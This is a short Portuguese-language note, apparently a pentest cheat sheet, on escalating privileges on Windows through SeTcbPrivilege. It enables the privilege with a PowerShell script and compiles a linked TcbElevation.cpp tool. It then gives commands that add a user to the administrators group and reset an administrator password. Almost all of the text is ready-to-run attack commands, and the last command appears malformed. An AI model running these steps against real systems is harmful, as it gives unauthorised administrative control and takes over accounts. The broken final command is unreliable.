Caso o privilegio esteja deshabilitado, podemos revertirlo com [Set-TokenPrivilege.ps1](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)

<img width="1335" height="905" alt="image" src="https://github.com/user-attachments/assets/86287a23-6987-484e-89aa-8da1912648c9" />

` Set-TokenPrivilege.ps1 -Privilege SeTcbPrivilege `

<img width="990" height="184" alt="image" src="https://github.com/user-attachments/assets/c6ab2a5d-855a-4f2f-8f24-e7f6ece44991" />


Compilamos a ferramenta [TcbElevation.cpp](https://gist.githubusercontent.com/antonioCoco/19563adef860614b56d010d92e67d178/raw/f044e4be7c59c58968dbae56e586e1400ab35f32/TcbElevation.cpp)

``` x86_64-w64-mingw32-g++ -o TcbElevation.exe TcbElevation.cpp -lsecur32 -ladvapi32 -municode -static-libgcc -static-libstdc++ ```

Adicionamos um usuario ao grupo administrators

`TcbElevation.exe fakeservice  "C:\Windows\System32\cmd.exe" /c net localgroup administrators user /add`

Por cada vez que utulicemos o TcbElevation.exe, o parametro fakesrvice deve muda a qualquer outro nome, por exemplo aqui mudamos a senha do admin

`TcbElevation.exe rsrsrsrs  "C:\Windows\System32\cmd.exe" /c net user administrators 'Password123!' /`
